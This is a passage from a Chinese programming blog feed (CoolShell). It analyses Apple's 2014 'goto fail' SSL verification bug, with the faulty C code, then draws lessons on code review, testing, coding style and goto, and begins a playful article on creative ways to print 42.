<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-02-22T00:27:10+08:00</pubDate>
<guid>https://coolshell.cn/articles/11094.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 由苹果的低级Bug想到的 ]]></title>
<link>https://coolshell.cn/articles/11112.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" > 2014年2月22日，在这个“这么二”的日子里，苹果公司推送了 iOS 7.0.6（版本号11B651）修复了 SSL 连接验证的一个 bug。官方网页在这里：<a href="https://support.apple.com/kb/HT6147" target="_blank">http://support.apple.com/kb/HT6147</a>，网页中如下描述：</p>
<blockquote>
<p><strong>Impact</strong>: An attacker with a privileged network position may capture or modify data in sessions protected by SSL/TLS</p>
<p><strong>Description</strong>: Secure Transport failed to validate the authenticity of the connection. This issue was addressed by restoring missing validation steps.</p>
</blockquote>
<p>也就是说，这个bug会引起中间人攻击，bug的描述中说，这个问题是因为miss了对连接认证的合法性检查的步骤。</p>
<p>这里多说一句，<strong>一旦网上发生任何的和SSL/TL相关的bug或安全问题，不管是做为用户，还是做为程序员的你，你一定要高度重视起来</strong>。因为这个网络通信的加密协议被广泛的应用在很多很多最最需要安全的地方，如果SSL/TLS有问题的话，意味着这个世界的计算机安全体系的崩溃。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Bug%E7%9A%84%E4%BB%A3%E7%A0%81%E5%8E%9F%E5%9B%A0" title="Bug的代码原因">Bug的代码原因</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83" title="一些思考">一些思考</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#0%EF%BC%89%E5%85%B3%E4%BA%8E%E7%BC%96%E8%AF%91%E6%8A%A5%E8%AD%A6" title="0）关于编译报警">0）关于编译报警</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#1%EF%BC%89%E5%85%B3%E4%BA%8ECode_Merge_%E5%92%8C_Code_Review" title="1）关于Code Merge 和 Code Review">1）关于Code Merge 和 Code Review</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#2%EF%BC%89%E5%85%B3%E4%BA%8E%E6%B5%8B%E8%AF%95" title="2）关于测试">2）关于测试</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#3%EF%BC%89%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC" title="3）关于编码风格">3）关于编码风格</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#4%EF%BC%89%E5%85%B3%E4%BA%8Egoto%E8%AF%AD%E5%8F%A5" title="4）关于goto语句">4）关于goto语句</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Bug%E7%9A%84%E4%BB%A3%E7%A0%81%E5%8E%9F%E5%9B%A0"></span>Bug的代码原因<span class="ez-toc-section-end"></span>
</h4>
<p>Adam Langley的《<a href="https://www.imperialviolet.org/2014/02/22/applebug.html">Apple’s SSL/TLS bug</a> 》的博文暴出了这个bug的细节。（在苹果的开源网站上，通过查看苹果的和SSL/TLS有关的代码变更，我们可以在文件<a href="https://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c" target="_blank">sslKeyExchange.c</a>中找到下面的代码）</p>
<p><span id="more-11112"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW" data-enlighter-highlight="12">static OSStatus
SSLVerifySignedServerKeyExchange(SSLContext *ctx, bool isRsa, SSLBuffer signedParams,
                                 uint8_t *signature, UInt16 signatureLen)
{
	OSStatus        err;
	...

	if ((err = SSLHashSHA1.update(&amp;hashCtx, &amp;serverRandom)) != 0)
		goto fail;
	if ((err = SSLHashSHA1.update(&amp;hashCtx, &amp;signedParams)) != 0)
		goto fail;
		goto fail;
	if ((err = SSLHashSHA1.final(&amp;hashCtx, &amp;hashOut)) != 0)
		goto fail;
	err = sslRawVerify(ctx,
                       ctx-&gt;peerPubKey,
                       dataToSign,				/* plaintext */
                       dataToSignLen,			/* plaintext length */
                       signature,
                       signatureLen);
	if(err) {
		sslErrorLog("SSLDecodeSignedServerKeyExchange: sslRawVerify "
                    "returned %d\n", (int)err);
		goto fail;
	}

fail:
    SSLFreeBuffer(&amp;signedHashes);
    SSLFreeBuffer(&amp;hashCtx);
    return err;
}</pre>
<p>注意，我高亮的地方，也就是那里有两个goto fail; 因为if语句没有加大括号，所以，只有第一个goto是属于if的，而第二个goto则是永远都会被执行到的（注：这里不是Python是C语言，缩进不代表这个语句属于同一个语句块）。也就是说，就算是前面的if检查都失败了（err  == 0），也会goto fail。我们可以看到fail标签中释放完内存后就会return err;</p>
<p>你想一下，<strong>这段程序在SSLHashSHA1.update()  返回成功，也就是返回0 的时候会发生什么样的事？是的，真正干活的 sslRawVerify()被bypass了。而且这个函数SSLVerifySignedServerKeyExchange() 还返回了0，也就是成功了！</strong>尼玛！你可能想到酷壳网上之前《<a title="一个空格引发的惨剧" href="https://coolshell.cn/articles/4875.html" target="_blank">一个空格引发的惨剧</a>》的文章。都是低级bug。</p>
<p>这个低级bug在这个周末在网上被炒翻了天，你可以<strong><a href="https://twitter.com/search?q=%23gotofail" target="_blank">上Twiter上看看#gotofail的标签的盛况</a></strong>。<strong>Goto Fail必然会成为历史上的一个经典事件</strong>。</p>
<p>如果你喜欢XKCD，你一定会想到这个漫画：</p>
<p><img alt="image placeholder" ></p>
<p><span style="line-height: 1.5em;"><strong>注意</strong>：这个bug不会影响TLS 1.2版本，因为1.2版本不会用这个函数，走的是另一套机制。但是别忘了client端是可以选择版本的。</span></p>
<p>如果你想测试一下你的浏览器是否会有问题，<strong>你可以上一下当天就上线的<a href="https://gotofail.com/" target="_blank"> https://gotofail.com</a> 网站</strong></p>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83"></span>一些思考<span class="ez-toc-section-end"></span>
</h4>
<p>下面是我对这个问题的一些思考。</p>
<h5>
<span class="ez-toc-section" id="0%EF%BC%89%E5%85%B3%E4%BA%8E%E7%BC%96%E8%AF%91%E6%8A%A5%E8%AD%A6"></span>0）关于编译报警<span class="ez-toc-section-end"></span>
</h5>
<p>有人在说苹果的这个代码中的goto语句会产生死代码——dead code，也就是永远都不会执行到的代码，C/C++的编程器是会报警的。但，实际上，dead code在默认上的不会报警的。即使你加上-Wall，GCC 4.8.2 或 Clang 3.3 都不会报警，包括Visual Studio 2012在默认的报警级别也不会（默认是/W3级，需要上升到/W4级以上，但是升级到/W4上，你的工程可能会有N多的Warning，你不一定能看得过来）。gcc和Clang有一个参数叫：-Wunreachable-code，是可以对这种情况报警的，但即没有被包括在-Wall里。原因是，这个参数有很多的问题，因为编译器的优化代码的行为，这个参数并不能对每种情况都准确地报告。另请注意，GCC的新版本中剔除了这个参数。当然，其它一些静态的代码检查工具也可以检查这个低级的问题。</p>
<p>另外，是不是用IDE的代码自动化格式工具也可以帮上一点忙呢？至少可以把那个缩进变成让人一看就觉得有问题。</p>
<h5>
<span class="ez-toc-section" id="1%EF%BC%89%E5%85%B3%E4%BA%8ECode_Merge_%E5%92%8C_Code_Review"></span>1）关于Code Merge 和 Code Review<span class="ez-toc-section-end"></span>
</h5>
<p>你可以通过这里的代码比较看到这个bug的diff，也可以到<a href="https://gist.github.com/alexyakoubian/9151610/revisions" target="_blank">这里看看</a>（631行）。</p>
<blockquote style="font-size: 11px;"><p>diff -urN &lt;(curl -s http://opensource.apple.com/source/Security/Security-55179.13/libsecurity_ssl/lib/sslKeyExchange.c\?txt) \ &lt;(curl -s http://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c\?txt) \</p></blockquote>
<p>通过code diff你可以看到，<strong>苹果公司是在重构代码——为很多函数去掉了ctx的参数</strong>。</p>
<p>所以，我们可以猜测，两个goto fail语句，可能是因为对code在不同branch上做merge发生的。版本工具merge代码的时候，经常性的会出现这样的问题。如果代码的diff很多，这个问题会很容易就没有注意到。就算有code review，这个有问题的代码也很难被找出来的。<strong>如果你来review下面的diff，你会注意到这个错误吗？</strong></p>
<p><img alt="image placeholder" ></p>
<p>也就是说，在重构分支上的代码是对的，但是在分支merge的时候，被merge工具搞乱了。所以说，<strong>我们在做code merge的时候，一定要小心小心再小心，不能完全相信merge工具</strong>。</p>
<h5>
<span class="ez-toc-section" id="2%EF%BC%89%E5%85%B3%E4%BA%8E%E6%B5%8B%E8%AF%95"></span>2）关于测试<span class="ez-toc-section-end"></span>
</h5>
<p>很明显，这个bug很难被code review发现。对于重构代码和代码merge里众多的diff，是很难被review的。</p>
<p>当然，“事后诸葛亮”的人们总是很容易地说这个问题可以被测试发现，但是实际情况是这样的吗？</p>
<p>这个问题也很难被功能测试发现，因为这个函数在是在网络握手里很深的地方，功能 测试不一定能覆盖得那么深，你要写这样的case，必需对TLS的协议栈非常熟悉，熟悉到对他所有的参数都很熟悉，并能写出针对每一个参数以及这些参数的组合做一堆test case，这个事情也是一件很复杂的事。要写出所有的case本身就是一件很难很难的事情。关于这个叫SSLVerifySignedServerKeyExchange()函数的细节，你可以看看相关的<a href="https://tools.ietf.org/html/rfc5246#section-7.4.3">ServerKeyExchange</a> RFC文档。</p>
<p>如果只看这个问题的话，你会说对这个函数做的 Unit Test 可以发现这个问题，是的。但是，别忘了SSL/TLS这么多年了，这些基础函数都应该是很稳定的了， 在事前，我们可能不会想到要去为这些稳定了多少年的函数写几个Unit Test。</p>
<p><strong>只要有足够多的时间，我们是可以对所有的功能点，所有的函数都做UT，也可以去追求做代码覆盖和分支覆盖一样。但有一点我们却永远无法做到，那就是——穷举所有的负面案例</strong>。所以，对于测试来说，我们不能走极端，需要更聪明的测试。就像我在《<a title="我们需要专职的QA吗？" href="https://coolshell.cn/articles/6994.html" target="_blank">我们需要专职的QA</a>》文章里的说过的——<strong>测试比coding难度大多了，测试这个工作只有高级的开发人员才做得好。我从来不相信不写代码的人能做好测试。</strong></p>
<p>这里，<strong>我并不是说通过测试来发现这个问题的可能性不大，我想说的是，测试很重要，单测更重要。但是，我们无法面面俱到</strong>。在我们没有关注到的地方，总会发生愚蠢的错误。</p>
<p>P.S.，在各大网站对这个事的讨论中，我们可以看到OS X下的curl命令居然可以接受一个没有验证过的IP地址的https的请求，虽然现在还没有人知道这事的原因，但是，这可能是没有在测试中查到的一个原因。</p>
<h5>
<span class="ez-toc-section" id="3%EF%BC%89%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC"></span>3）关于编码风格<span class="ez-toc-section-end"></span>
</h5>
<p><span style="line-height: 1.5em;">对于程序员来说，在C语言中，省掉语句大括号是一件非常不明智 的事情。如我们强制使用语句块括号，那么，这两个goto fail都会在一个if的语句块里，而且也容易维护并且易读。（另外，通过这个bug，我们可以感受到，像Python那样，用缩进来表示语句块，的确是挺好的一件事）</span></p>
<p>也有人说，如果你硬要用只有单条语句，且不用语句块括号，那么，这就是一条语句，应该放在同一行上。如下所示：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">if  (check_something)   do_something(); </code></p>
<p>但是这样一来，你在单步调试代码的时候，就有点不爽了，当你step over的时候，你完全不知道if的条件是真还是假。所以，还是分多行，加上大括号会好一些。</p>
<p>相似的问题，我很十多年前也犯过，而且那次我出的问题也比较大，导致了用户的数据出错。那次就是维护别人的代码，别人的代码就是没有if的语句块括号，就像苹果的代码那样。<span style="line-height: 1.5em;">我想在return z之前调用一个函数，结果就杯具了：</span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW" data-enlighter-highlight="6">if ( ...... )
    return x;
if ( ...... )
    return y;
if ( ...... )
    foo();
    return z;</pre>
<p>这个错误一不小心就犯了，因为人的大脑会相当然地认为缩进的都是一个语句块里的。但是如果原来的代码都加上了大括号，然后把缩进做正常，那么对后面维护的人会是一个非常好的事情。就不会犯我这个低级错误了。就像下面的代码一样，虽然写起来有点罗嗦，但利人利己。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">if ( ...... ){
    return x;
}
if ( ...... ){
    return y;
}
if ( ...... ){
    return z;
}</pre>
<p>与此类似的代码风格还有如下，你觉得哪个更容易阅读呢？</p>
<ul>
<li>if (!p)    和  if (p == NULL)</li>
</ul>
<ul>
<li>if (p)    和  if (p != NULL)</li>
</ul>
<ul>
<li>if (!bflag)  和 if  (bflag == false)</li>
</ul>
<ul>
<li>if ( CheckSomthing() )  和 if ( CheckSomething() == true )</li>
</ul>
<p>另外还有很多人在switch 语句里用case来做if，也就是说case后面没有break。就像<a href="https://en.wikipedia.org/wiki/Duff's_device" target="_blank">Duff’s Device</a>一样，再配以goto，代码就写得相当精彩了（这里<a href="https://github.com/agentzh/luajit2/blob/master/src/host/buildvm.c#L395" target="_blank">有个例子</a>）</p>
<p><span style="line-height: 1.5em;">所以说，代码不是炫酷的地方是给别人读的。</span></p>
<p>另外，我在想，为什么苹果的这段代码不写成下面这样的形式？你看，下面这种情况不也很干净吗？</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">if (  ((err = ReadyHash(&amp;SSLHashSHA1, &amp;hashCtx)) != 0 )
       || ((err = SSLHashSHA1.update(&amp;hashCtx, &amp;clientRandom)) != 0)
       || ((err = SSLHashSHA1.update(&amp;hashCtx, &amp;serverRandom) != 0)
       || ((err = SSLHashSHA1.update(&amp;hashCtx, &amp;signedParams) != 0)
       || ((err = SSLHashSHA1.final(&amp;hashCtx, &amp;hashOut)) != 0)) {

     goto fail;
}
</pre>
<p>其实，还可以做一些代码上的优化，比如，把fail标签里的那些东西写成一个宏，这样就可以去掉goto语句了。</p>
<h5>
<span class="ez-toc-section" id="4%EF%BC%89%E5%85%B3%E4%BA%8Egoto%E8%AF%AD%E5%8F%A5"></span>4）关于goto语句<span class="ez-toc-section-end"></span>
</h5>
<p>关于goto语句，1968年，<a href="https://en.wikipedia.org/wiki/Edsger_Dijkstra">Edsger Dijkstra</a> 投了一篇文章到Communications of the ACM。原本的标题是《A Case Against the Goto Statement》。CACM编辑<a href="https://en.wikipedia.org/wiki/Niklaus_Wirth">Niklaus Wirth</a>灵感来了，把标题改为我们熟知的 《<a href="http://www.u.arizona.edu/~rubinson/copyright_violations/Go_To_Considered_Harmful.html" target="_blank">Go To Statement Considered Harmful</a>》Dijkstra写的内容也是其一贯的犀利语气，文中说：“几年前我就观察到，一个程序员的品质是其程序中goto语句的密度成反比的”，他还说，“后来我发现了为什么goto语句的使用有这么严重的后果，并相信所有高级语言都应该把goto废除掉。”  （<strong>花絮</strong>：因为，这篇文章的出现，计算学界开始用’ <a href="https://en.wikipedia.org/wiki/Considered_harmful">X considered harmful</a> ‘当文章标题的风潮，直到<a href="http://meyerweb.com/eric/comment/chech.html">有人终于受不了</a>为止）</p>
<p>为什么goto语句不好呢？Dijkstra说，一个变量代表什么意义要看其上下文。一个程序用N<code></code>记录房间里的人数，在大部分时候，N<code></code>代表的是“目前房间里的人”。但在观察到又有一个人进房间后、把N<code></code>递增的指令前的这段程序区块中，N<code></code>的值代表的是“目前房间里的人数加一”。因此，要正确诠释程序的状态，必须知道程序执行的历史，或着说，知道现在“算到哪”了。</p>
<p>怎么谈“算到哪了”？如果是一直线执行下来的程序，我们只要指到那条语句，说“就是这里”，就可以了。如果是有循环程序，我们可能得说：“现在在循环的这个地方，循环已经执行了第<code>i</code>次”。如果是在函数中，我们可能得说：“现在执行到函数<code>p</code>的这一点；<code>p</code>刚刚被<code>q调用</code>，调用点在一个循环中，这个循环已经执行了<code>i</code>次”。</p>
<p>如果有goto<code>语句了</code>呢？那就麻烦了。因为电脑在执行某个指令前，可能是从程序中许许多多goto<code></code>其中之一跳过来的。要谈某变量的性质也几乎变得不可能了。这就是为什么goto语句问题。</p>
<p>Dijkstra的这篇文章对后面很多程序员有非常深的影响，包括我在内，都觉得Goto语句能不用就不用，虽然，我在十年前的《<a href="http://blog.csdn.net/haoel/article/month/2003/05" target="_blank">编程修养</a>》（这篇文章已经严重过时，某些条目已经漏洞百出）中的<a href="http://blog.csdn.net/haoel/article/details/2876" target="_blank">第23条</a>也说过，我只认为在goto语句只有一种情况可以使用，就是苹果这个bug里的用法。但是我也同意Dijkstra，goto语句能不用就不用了。就苹果的这个问题而言，在更为高级的C++中，<a href="https://en.wikipedia.org/wiki/Resource_Acquisition_Is_Initialization" target="_blank">使用RAII技术</a>，这样的goto语句已经没有什么存在的意义了。</p>
<p>Dijkstra这篇文章后来成为结构化程式论战最有名的文章之一。长达19年之后，Frank Rubin投了一篇文章到CACM,标题为《<a href="http://www.ecn.purdue.edu/ParaMount/papers/rubin87goto.pdf">‘ <code></code>Go To Considered Harmful’ Considered Harmful</a> 》Rubin说，「虽然Dijkstra的说法既太学术又缺乏说服力」，却似乎烙到每个程序员的心里了。这样，当有人说“用goto语句来解这题可能会比较好”会被严重鄙视。于是Rubin出了一道这样的题：令<code>X</code>为<code>N * N</code>的整数阵列。如果<code>X</code>的第<code>i</code>行全都是零，请输出<code>i</code>。如果不只一行，输出最小的<code>i</code> .</p>
<p>Rubin找了一些惯用goto和不用goto的程序员来解题，发现用goto的程序又快又清楚。而不用goto通常花了更多的时间，写出很复杂的解答。你觉得呢？ 另外，你会怎么写这题的程序呢？</p>
<p>（<strong>花絮</strong>：以后几个月的CACM热闹死了。编辑收到许多回应，两个月后刊出了其中五篇。文章也包括了《<a href="http://www.ecn.purdue.edu/ParaMount/papers/acm_may87.pdf">“‘GOTO Considered Harmful’ Considered Harmful” Considered Harmful?</a> 》）</p>
<p><strong>对于我而言，goto语句的弊远远大于利，在99%的情况下，我是站在反goto这边的</strong>。Java和Python就没有提供Goto语句，原因就是因为goto语句很容易被滥用！</p>
<p><strong>更新：2014年3月5日</strong> – RedHat 近日也发现个GnuTLS安全问题，与苹果的类似：无法正确检验特定的伪造SSL证书，这个总是会将伪造证书识别为有效证书。虽然Redhat的代码为if加上了花括号，但还是因为没有控制好goto，造成了bug。所以说啊，goto语句的坑是很多。</p>
<ul>
<li>BUG页面：<a href="https://bugzilla.redhat.com/show_bug.cgi?id=1069865" target="_blank">https://bugzilla.redhat.com/show_bug.cgi?id=1069865</a>
</li>
</ul>
<ul>
<li>相关的Diff: <a href="https://bugzilla.redhat.com/attachment.cgi?id=867911&amp;action=diff" target="_blank">https://bugzilla.redhat.com/attachment.cgi?id=867911&amp;action=diff</a>
</li>
</ul>
<p>goto语句在写代码的时候也许你会很爽，但是在维护的时候，绝对是一堆坑！redhat的这个patch为原来本来只有一个label的goto又加了另一个label，现在两个label交差goto，继续挖坑……</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>你看，我们不能完全消灭问题，但是，我们可以用下面几个手段来减少问题：</p>
<p style="padding-left: 30px;">1）<strong>尽量在编译上发生错误，而不是在运行时</strong>。</p>
<p style="padding-left: 30px;">2）<strong>代码是让人读的，顺便让机器运行</strong>。不要怕麻烦，好的代码风格，易读的代码会减少很多问题。</p>
<p style="padding-left: 30px;">3）<strong>Code Review是一件很严肃的事情</strong>，但 Code Reivew的前提条件是代码的可读性一定要很好。</p>
<p style="padding-left: 30px;">4）<strong>测试是一件很重要也是很难的事情，尤其是开发人员要非常重视</strong>。</p>
<p style="padding-left: 30px;">5）<strong>不要走飞线，用飞线来解决问题是可耻的！</strong>所以，用goto语句来组织代码的时代过去了，你可以有很多种方式不用goto也可以把代码组织得很好。</p>
<p>最后，我在淘宝过去的一年里，经历过一些P1/P2故障，尤其是去年的8-9月份故障频发的月份，我发现其中有70%的P1/P2故障，就是因为没有code review，没有做好测试，大量地用飞线来解决问题，归根结底就是只重业务结果，对技术没有应有的严谨的态度和敬畏之心。</p>
<p><span style="color: #cc0000;"><strong>正如苹果的这个“goto fail”事件所暗喻的，如果你对技术没有应有的严谨和敬畏之心，你一定会——</strong></span></p>
<p style="text-align: center; font-size: 36px; color: #cc0000; font-family: Georgia,;"><strong>Go To Fail !!!</strong></p>
<p>在这里唠叨这么多，与大家共勉！</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-02-24T08:12:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/11112.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何用最有创造力的方式输出42 ]]></title>
<link>https://coolshell.cn/articles/11170.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >酷壳似乎好长时间没有像《<a title="编程真难啊 - 80,069 人阅读" href="https://coolshell.cn/articles/1391.html">编程真难啊</a>》或是《<a title="老手是这样教新手编程的" href="https://coolshell.cn/articles/2420.html" target="_blank">老手是这样教新手编程的</a>》或是像《<a title="如何写出无法维护的代码" href="https://coolshell.cn/articles/4758.html" target="_blank">如何写出无法维护的代码</a>》这样“严肃正经”的文章了，所以，赶在大家还没有向我扔臭鸡蛋前奉献一篇。这篇文章来自CodeGolf.StackExchange上的《<a href="https://codegolf.stackexchange.com/questions/21835/most-creative-way-to-display-42">Most creative way to display 42</a>》—— 请以最有创造力的方式输出42。于是出现了下面的这些答案（注：精彩的总是留在最后面）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BA%BA%E7%94%9F%E5%92%8C%E5%AE%87%E5%AE%99%E7%BB%88%E7%BA%A7%E9%97%AE%E9%A2%98%E7%9A%84%E7%AD%94%E6%A1%88%EF%BC%9A42" title="人生和宇宙终级问题的答案：42">人生和宇宙终级问题的答案：42</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Ruby" title="Ruby">Ruby</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Javascript" title="Javascript">Javascript</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#CC" title="C/C++">C/C++</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Brainfuck" title="Brainfuck">Brainfuck</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BA%BA%E7%94%9F%E5%92%8C%E5%AE%87%E5%AE%99%E7%BB%88%E7%BA%A7%E9%97%AE%E9%A2%98%E7%9A%84%E7%AD%94%E6%A1%88%EF%BC%9A42"></span>人生和宇宙终级问题的答案：42<span class="ez-toc-section-end"></span>
</h4>
<p>这里，需要介绍一下为什么要输出42。这时因为42是我们人生，世界乃至整个宇宙的终级答案。这要从《银河系漫游指南》（英文名：The Hitchhiker’s Guide to the Galaxy）说起。这本书是著名英国科幻小说作家Douglas  Adams所著5本银河系漫游指南系列科幻喜剧系列小说中的第一本，改编自他本人为英国广播公司第四电台（BBC Radio 4）所写的广播剧剧本。该书1979年10月12日首次由麦克米伦出版公司（Pan Books）出版，次周成为英国图书销量榜冠军，前3个月内销售超过25万本。截至2005年，这本小说已被翻译成超过30种语言在全世界发行，并且被改编为电视剧、电影、舞台剧等多种艺术形式的作品。</p>
<p>这本小说中小说中充满尖锐的讽刺和隐喻，被西方科幻爱好者奉为“科幻圣经”。其中有两个关键词，一个是Don’t Panic，一个是42影响力很大，而其中关于42的故事简介是这样的：</p>
<p style="padding-left: 30px;">百万年前，老鼠其实是一种超智慧生物，它们建造了一部超级电脑深思Deep Thought，它们问超级电脑，生命、宇宙以及任何事情的终极答案（<i>Answer to Life, the Universe, and Everything</i>）什么，经过了750万年的计算，深思告诉老鼠的后人答案是<b>42</b>，深思解释它只能计算出答案是什么，但答案的原因必须由另一部更高智能的电脑才能解释，而该部电脑就是地球。经过了800万年，就在结果要出来的五分钟前，地球却因为挡在预定兴建的星际间高速公路的路线，被Vogons给毁灭，电脑没有给出最后的结果。</p>
<p><span id="more-11170"></span></p>
<p style="padding-left: 30px;">故事里面还说了这个42是6 乘于 9得来。当然，6乘9应该是54，但是因为地球上的电脑被搞坏了，导致主人翁答错了。至于后来有人说6 x 9 = 42是基于13进制，原作者说，完全没有这回事，他就是瞎搞的。</p>
<p>网上有很多人在猜测42的含义，比如<a href="https://www.douban.com/note/232036705/" target="_blank">douban的这篇文章</a>，但是原作者出来说这他就是随机想了一个，完全没有任何意义。</p>
<p>对于42来说，数字42和短语，“生命，宇宙以及一切的答案”（<i>Answer to Life, the Universe, and Everything</i>） 已达到在互联网上邪教的地位。在各种技术宅，极客，科学圈有着非同凡响的地位。</p>
<ul>
<li>您若在Google输入<a href="https://www.google.com/search?q=the+answer+to+life%2C+the+universe%2C+and+everything" target="_blank" rel="nofollow">the answer to life, the universe, and everything</a>，Google会直接回答42——而且还是用Google计算器算出来的。</li>
<li>若在<a title="Wolfram Alpha" href="https://zh.wikipedia.org/wiki/Wolfram_Alpha" target="_blank">Wolfram Alpha</a>中输入<a href="https://www.wolframalpha.com/input/?i=Answer+to+the+Ultimate+Question+of+Life%2C+the+Universe%2C+and+Everything" target="_blank" rel="nofollow">Answer to the Ultimate Question of Life, the Universe, and Everything</a>，Wolfram Alpha也会回答42</li>
<li>若在iPhone/iPad的Siri中问[What’s the meaning of life?]，Siri也会回答42</li>
<li>
<span><span>在</span></span><a title="OpenOffice.org" href="https://en.wikipedia.org/wiki/OpenOffice.org"><span>OpenOffice.org</span></a><span><span>软件，如果您在任何单元格输入spreadsheet=ANTWORT(“Das Leben, das Universum und der ganze Rest”) (注：德语的ANSWER(“life, the universe and everything”))，结果也会是42。</span></span>
</li>
</ul>
<p>另外，在美剧《Lost》里那个经典的数字序列： 4, 8, 15, 16, 23,42。经Lost的导演确认，最后那个42也是源自《银河系漫游指南》</p>
<p>好了，言归正传，下面让我们来看一下如何输出42的。</p>
<h4>
<span class="ez-toc-section" id="Ruby"></span>Ruby<span class="ez-toc-section-end"></span>
</h4>
<p><code data-enlighter-language="ruby" class="EnlighterJSRAW"></code>puts (6 * 9).to_s(13)[/h4]</p>
<p>解释：6 x 9 = 42的表达式（基于13进制）</p>
<h4>
<span class="ez-toc-section" id="Javascript"></span>Javascript<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">String.prototype.answer = function() {
    alert(this.charCodeAt(+!"The End of the Universe"));
};
'*'.answer();[/javascript]

解释：+!"The End of the Universe"的值是0，'*'的ASCII码是42

[javascript]console.log("Douglas Adams".length + "born on".length +
    [1,1,0,3,1,9,5,2].reduce(
        function(previousValue, currentValue, index, array){
            return previousValue + currentValue;
        }
    )
);

 /* [1,1,0,3,1,9,5,2] =&gt; March 11, 1952 */[/javascript]

解释：Douglas Adams 是一位英国广播剧作家、和音乐家，尤其以《银河系漫游指南》系列作品出名。这部作品以广播剧起家，后来发展成包括五本书的“三部曲”，拍成电视连续剧。亚当斯逝世后还拍成电影。 除《银河系漫游指南》系列外亚当斯还参加了科幻电视连续剧《神秘博士》的拍摄工作，他写了其中的一些剧本。也的生日是 1952 年 3 月 11 日。

[javascript]alert((!![]+ -~[])*(!![]+ -~[])+""+(!![]+ -~[]))[/javascript]

解释：[]是个空，![]就是true，~[]是-1, 于是，表达式就这样出来了。变态！

[javascript]var ________ = 0.023809523809523808, ____ = 1, ___ = 0, __ = 0, _ = 1;

       __ -           ___
     /_  |0        //     \\
    /_/   0     //          \\
   /_/_  |0                //
  /_/_   |0              //
 /_/____ |_           //
/________|0        //
         |0     //______________[/javascript]

解释：这个其实是代码混乱的技巧之一，用下划线当变量。你可以参考《&lt;a href="https://coolshell.cn/articles/933.html" target="_blank"&gt;如何加密/混乱C源代码&lt;/a&gt;》和《&lt;a href="https://coolshell.cn/articles/914.html" target="_blank"&gt;6个变态的C语言Hello World程序&lt;/a&gt;》&lt;/pre&gt;
&lt;h4&gt;Shell&lt;/h4&gt;

[shell]echo "what is the universe"|tr "a-z " 0-7-0-729|sed 's/9.//g;s/-/+/'|bc[/shell]

